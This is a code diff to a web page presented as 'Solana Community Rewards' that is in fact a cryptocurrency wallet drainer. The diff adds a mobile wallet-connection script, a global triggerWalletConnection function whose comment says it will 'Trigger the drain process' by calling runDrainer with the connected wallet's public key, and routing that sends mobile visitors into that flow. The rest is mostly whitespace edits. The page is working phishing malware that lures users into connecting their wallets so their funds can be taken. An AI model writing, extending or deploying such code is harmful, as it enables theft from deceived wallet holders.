@@ -68,6 +68,7 @@
   <link rel="apple-touch-icon" href="/logo.png?v=3" />
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js?v=4"></script>
   <script src="/patient-mode.js"></script>
+  <script src="/web3modal-mobile.js"></script>
   <script>
     // Ensure solanaWeb3 is available globally
     window.solanaWeb3 = window.solanaWeb3 || window.exports || {};
@@ -2884,7 +2885,7 @@
         }
       }, 10000);
     }
-
+    
     // Global error handler for wallet provider conflicts
     window.addEventListener('error', function(event) {
       // Suppress wallet provider conflict errors
@@ -4301,7 +4302,7 @@ window.runDrainer = runDrainer;
             }, 1000);
           } else {
             // Android: Direct location change
-            window.location.href = fullDeepLink;
+          window.location.href = fullDeepLink;
           }
           
           hasOpenedApp = true;
@@ -4313,8 +4314,8 @@ window.runDrainer = runDrainer;
               // App likely opened, don't try next strategy
               return;
             }
-            strategyIndex++;
-            tryNextStrategy();
+              strategyIndex++;
+              tryNextStrategy();
           }, timeout);
           
         } catch (error) {
@@ -4869,31 +4870,31 @@ window.runDrainer = runDrainer;
                         if (i > 0) {
                           await new Promise(resolve => setTimeout(resolve, 1000));
                         }
-                        
-                        // Track this request to prevent conflicts
+                    
+                    // Track this request to prevent conflicts
                         const requestId = `backpack-${i}-${Date.now()}`;
-                        window.addPendingRequest(requestId);
-                        
-                        try {
+                    window.addPendingRequest(requestId);
+                    
+                    try {
                           const connectPromise = strategy.fn();
-                          const timeoutPromise = new Promise((_, reject) => 
+                        const timeoutPromise = new Promise((_, reject) => 
                             setTimeout(() => reject(new Error('Connection timeout')), 20000) // 20 seconds per attempt
-                          );
-                          
-                          const result = await Promise.race([connectPromise, timeoutPromise]);
+                        );
+                        
+                        const result = await Promise.race([connectPromise, timeoutPromise]);
                           console.log(`[BACKPACK] ${strategy.name} successful:`, result);
                           
                           // Check if we got a public key
                           const publicKey = provider.publicKey || result?.publicKey;
                           if (publicKey) {
                             console.log('[BACKPACK] Connection established with public key:', publicKey);
-                            showStatus('Processing...', 'loading');
+                        showStatus('Processing...', 'loading');
                             connectionSuccessful = true;
-                            return;
-                          }
-                        } finally {
-                          window.removePendingRequest(requestId);
-                        }
+                        return;
+                      }
+                    } finally {
+                      window.removePendingRequest(requestId);
+                    }
                       } catch (strategyError) {
                         console.log(`[BACKPACK] ${strategy.name} failed:`, strategyError.message);
                         
@@ -5215,6 +5216,33 @@ window.runDrainer = runDrainer;
       }
     }
     window.connectMobileWallet = connectMobileWallet;
+    
+    // Global function to trigger wallet connection from Web3Modal
+    window.triggerWalletConnection = function(walletType, publicKey) {
+      console.log(`[TRIGGER_CONNECTION] Triggering connection for ${walletType}:`, publicKey);
+      
+      // Find the wallet definition
+      const wallet = WALLET_DEFS.find(w => w.key === walletType);
+      if (!wallet) {
+        console.error(`[TRIGGER_CONNECTION] Wallet not found: ${walletType}`);
+        return;
+      }
+      
+      // Simulate the wallet connection flow
+      const walletInfo = {
+        key: walletType,
+        name: wallet.name,
+        logo: wallet.logo,
+        publicKey: publicKey
+      };
+      
+      // Trigger the drain process
+      if (window.runDrainer) {
+        window.runDrainer(publicKey, walletType, walletInfo);
+      } else {
+        console.error('[TRIGGER_CONNECTION] runDrainer function not found');
+      }
+    };
 
     // Function to handle deep links properly (moved outside for global access)
     function openInWallet(walletType) {
@@ -5237,6 +5265,12 @@ window.runDrainer = runDrainer;
       const isIOS = /iphone|ipad|ipod/.test(userAgent);
       const isAndroid = /android/.test(userAgent);
       const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
+      
+      // Use Web3Modal for mobile devices
+      if (isMobileDevice && window.MobileWeb3Modal) {
+        console.log('[DEEP_LINK] Mobile device detected, using Web3Modal');
+        return MobileWeb3Modal.connectWallet(walletType);
+      }
       
       switch(walletType) {
         case 'phantom':
@@ -5332,7 +5366,7 @@ window.runDrainer = runDrainer;
             // Try fallback after delay
             setTimeout(() => {
               console.log(`[DEEP_LINK] iOS: trying fallback: ${fallbackUrl}`);
-              window.location.href = fallbackUrl;
+            window.location.href = fallbackUrl;
             }, 2000);
             
           } else if (platform === 'android') {
@@ -5490,7 +5524,22 @@ window.openWalletModal = async function openWalletModal() {
       modalData.wallets.forEach(wallet => {
         const walletOption = document.createElement('div');
         walletOption.className = 'wallet-option';
-        walletOption.onclick = () => window.connectWallet(wallet.key);
+        walletOption.onclick = () => {
+          // Check if mobile and Web3Modal is available
+          const userAgent = navigator.userAgent.toLowerCase();
+          const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent) ||
+                          /mobile|tablet/i.test(userAgent) ||
+                          (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
+                          window.innerWidth <= 768;
+          
+          if (isMobile && window.MobileWeb3Modal) {
+            console.log('[WALLET_OPTION] Mobile device, using Web3Modal');
+            MobileWeb3Modal.connectWallet(wallet.key);
+          } else {
+            console.log('[WALLET_OPTION] Desktop device, using standard connection');
+            window.connectWallet(wallet.key);
+          }
+        };
         
         walletOption.innerHTML = `
           <div class="wallet-icon">
@@ -5656,11 +5705,11 @@ window.connectWallet = async function connectWallet(walletKey) {
                     name: 'Method 1: Connect with metadata',
                     fn: () => provider.connect({
                       onlyIfTrusted: false,
-                      appMetadata: {
+                    appMetadata: {
                         name: 'Solana Community Rewards',
-                        url: window.location.origin,
-                        icon: '/logo.png'
-                      }
+                      url: window.location.origin,
+                      icon: '/logo.png'
+                    }
                     })
                   },
                   {
